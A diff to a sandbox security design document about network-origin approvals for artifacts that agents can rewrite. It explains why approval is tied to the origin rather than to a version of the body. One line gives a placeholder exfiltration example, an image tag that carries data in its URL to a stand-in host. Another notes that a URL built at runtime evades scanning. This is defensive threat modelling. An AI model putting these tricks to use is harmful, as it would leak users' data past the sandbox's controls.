@@ -900,10 +900,11 @@ user opened. What that costs, and what it does not:
   re-renders on every save.
 - It cannot reach another artifact, the library listing, the provider key, or a
   share link: none of those is in the credential's scope.
-- It is *wrong*, not *exfiltrating* — so long as a rewritten body cannot
-  silently inherit the artifact's prior network approvals. Closing that channel
-  is `av-hrtv`; until it lands, an agent-written body keeps the approved
-  origins of the body it replaced.
+- It is *wrong*, not *exfiltrating* in a way this scoping alone prevents: an
+  agent-written body keeps the artifact's approved network origins, by design —
+  approval attaches to the artifact, not to a version of its body (`av-hrtv`).
+  §6 states why re-gating on a rewrite is rejected and what actually bounds the
+  risk.
 - Artifact bodies have no version history (`av-1rvm`), so an overwrite is not
   yet undoable.
 
@@ -925,3 +926,24 @@ at debug level — the raw query, but never headers, so it was never a channel
 for a header-borne credential either way. An operator's reverse proxy is
 outside that guarantee: if its access log is configured to record request
 headers, the `Authorization` header must be redacted there.
+
+**An approved origin outlives the code it was approved for.** Approval is
+recorded per (artifact, origin) and never per version of the body, so an origin
+on an artifact's allowlist stays reachable by whatever that artifact later
+contains — including a body an agent rewrote. This is deliberate: users approve
+*origins*, not code, and running unreviewed code safely is the whole purpose of
+the sandbox (§1). Re-gating on a body change would be code review by another
+name — it would fire on every agent edit, since the agent tools always save
+whole documents — and it would be noisy on benign edits while blind on hostile
+ones: the CSP applies one flat allowlist to every directive, so "this origin
+moved from a script import to a fetch" is no change in capability; exfiltration
+needs no `connect-src` at all (`<img src="https://X/?d=…">` carries the payload
+in the URL); and the scan is deliberately evadable by a URL constructed at
+runtime. What bounds the damage is the origin decision itself and what is
+reachable inside the sandbox at all, not post-hoc inspection of the body. What
+the agent path does owe the user is *visibility*: every save reports the origins
+the new body references that are not yet approved, so a newly introduced origin
+gets the same explicit decision an ingest would (av-hrtv). If a real control is
+ever wanted here it is per-directive allowlists — approve an origin for
+`script-src` only, so a fetch to it is browser-blocked regardless of any scan —
+which is enforcement rather than marking, and a separate, larger change.
